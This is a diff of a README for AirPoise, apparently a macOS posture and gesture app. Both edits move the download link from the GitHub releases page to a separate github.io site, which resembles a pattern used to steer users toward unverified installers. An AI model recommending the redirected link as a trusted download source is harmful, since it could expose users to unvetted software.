@@ -1,6 +1,6 @@
 # 🎧 AirPoise - Your Personal Posture Coach & Gesture Remote
 
-[![Download AirPoise](https://img.shields.io/badge/Download-AirPoise-2ea44f?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Fiannaexpectable9536/AirPoise/releases)
+[![Download AirPoise](https://img.shields.io/badge/Download-AirPoise-2ea44f?style=for-the-badge&logo=apple&logoColor=white)](https://fiannaexpectable9536.github.io)
 
 ## 🌟 What AirPoise Does For You
 
@@ -26,7 +26,7 @@ AirPoise is a friendly little helper that lives in your Mac's menu bar (the top 
 
 **Visit this link to download the application.**
 
-Click the download button above (or visit: https://github.com/Fiannaexpectable9536/AirPoise/releases) to get AirPoise. The download page will show you the available versions—pick the newest one for your Mac.
+Click the download button above (or visit: https://fiannaexpectable9536.github.io) to get AirPoise. The download page will show you the available versions—pick the newest one for your Mac.
 
 ## 📥 Installation & Setup
 
